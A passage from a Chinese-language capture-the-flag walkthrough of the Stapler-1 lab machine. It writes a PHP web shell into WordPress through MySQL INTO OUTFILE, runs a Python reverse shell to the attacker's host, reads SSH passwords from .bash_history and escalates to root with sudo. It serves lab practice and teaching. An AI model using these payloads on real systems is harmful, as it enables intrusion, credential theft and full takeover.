define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

找到mysql数据库的账号和密码：root/plbkac，接下来连接数据库

首先猜测网站绝对路径如下

``` bash
MySQL [wordpress]> select load_file('/var/www/https/robots.txt');
+-------------------------------------------------------------+
| load_file('/var/www/https/robots.txt')                      |
+-------------------------------------------------------------+
| User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
 |
+-------------------------------------------------------------+
1 row in set (0.001 sec)
```

使用以下myssql语句写入木马

``` bash
MySQL [wordpress]> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
Query OK, 1 row affected (0.001 sec)
```

成功写入木马并能执行命令

``` bash
https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=id
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub253.jpg)

现在执行下面命令来反弹一个shell

浏览器执行

``` bash
https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

kali端，成功的弹回了shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.56.122: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.122] 54522
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/var/www/https/blogblog/wp-content/uploads
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@red:/var/www/https/blogblog/wp-content/uploads$ whoami
whoami
www-data
```

使用下面的命令尝试找出ssh的账号密码

``` bash
www-data@red:/$ pwd
pwd
/
www-data@red:/$ find -name ".bash_history" -exec cat {} \; 2>/dev/null
find -name ".bash_history" -exec cat {} \; 2>/dev/null
...
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
...
```

发现下面两个账号密码均能成功登录

``` bash
JKanode    thisimypassword
peter      JZQuyIN5
```

``` bash
root@kali:~# ssh JKanode@192.168.56.122
The authenticity of host '192.168.56.122 (192.168.56.122)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.122' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
Enter passphrase for key '/root/.ssh/id_rsa': 
JKanode@192.168.56.122's password: 
Welcome back!



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

JKanode@red:~$ id
uid=1013(JKanode) gid=1013(JKanode) groups=1013(JKanode)
JKanode@red:~$ whoami
JKanode
```

``` bash
root@kali:~# ssh peter@192.168.56.122
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
Enter passphrase for key '/root/.ssh/id_rsa': 
peter@192.168.56.122's password: 
Welcome back!

This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses ---
Aborting.
The function will be run again next time.  To prevent this, execute:
  touch ~/.zshrc
red%
red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red% whoami
peter
```

执行下面的命令利用peter用户提权

``` bash
red% sudo usermod -s /bin/bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Usage: usermod [options] LOGIN

Options:
  -c, --comment COMMENT         new value of the GECOS field
  -d, --home HOME_DIR           new home directory for the user account
  -e, --expiredate EXPIRE_DATE  set account expiration date to EXPIRE_DATE
  -f, --inactive INACTIVE       set password inactive after expiration
                                to INACTIVE
  -g, --gid GROUP               force use GROUP as new primary group
  -G, --groups GROUPS           new list of supplementary GROUPS
  -a, --append                  append the user to the supplemental GROUPS
                                mentioned by the -G option without removing
                                him/her from other groups
  -h, --help                    display this help message and exit
  -l, --login NEW_LOGIN         new value of the login name
  -L, --lock                    lock the user account
  -m, --move-home               move contents of the home directory to the
                                new location (use only with -d)
  -o, --non-unique              allow using duplicate (non-unique) UID
  -p, --password PASSWORD       use encrypted password for the new password
  -R, --root CHROOT_DIR         directory to chroot into
  -s, --shell SHELL             new login shell for the user account
  -u, --uid UID                 new UID for the user account
  -U, --unlock                  unlock the user account
  -v, --add-subuids FIRST-LAST  add range of subordinate uids
  -V, --del-subuids FIRST-LAST  remove range of subordinate uids
  -w, --add-subgids FIRST-LAST  add range of subordinate gids
  -W, --del-subgids FIRST-LAST  remove range of subordinate gids
  -Z, --selinux-user SEUSER     new SELinux user mapping for the user account

red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red% whoami
peter
red% sudo -i
➜  ~ id
uid=0(root) gid=0(root) groups=0(root)
➜  ~ whoami
root
➜  ~ cd /root
➜  ~ ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  ~ cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

成功的获取到了root用户的权限并拿到了flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub254.jpg)

#### 其他方法

也可以访问wordpress数据库后然后选择用户john并破解hash值，它将是“不正确的”使用用户“john”和密码“incorrect”访问wordpress然后导航以添加插件，然后上传shell，将在/blogblog/wp-content/uploads目录中找到shell

使用nc作为侦听器建立连接之后，还可以使用下面的方法进行提权

 - 提权参考1 [Linux-UAF通过bpf-BPF-PROG-LOAD-错误路径中的double-fdput](https://bugs.chromium.org/p/project-zero/issues/detail?id=808)

 - 提权参考2 [Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权](https://www.exploit-db.com/exploits/39772)

<font color="red">其它更多方法请自行尝试。。。</font>

#### 知识点总结

 - wordpress用户枚举
 - WordPress Plugin Advanced Video 1.0 - 本地文件包含
 - python poc修改
 - select load_file('/var/www/https/robots.txt'); mysql语句读取文件内容
 - select "php木马内容" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php"; mysql语句写入木马
 - python脚本反弹shell

``` bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
 - find命令寻找登录的历史ssh密码

``` bash
find -name ".bash_history" -exec cat {} \; 2>/dev/null
```
 - sudo -i提权

``` bash
sudo usermod -s /bin/bash
sudo -i
```
 - Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Stapler-1 -->

</details>

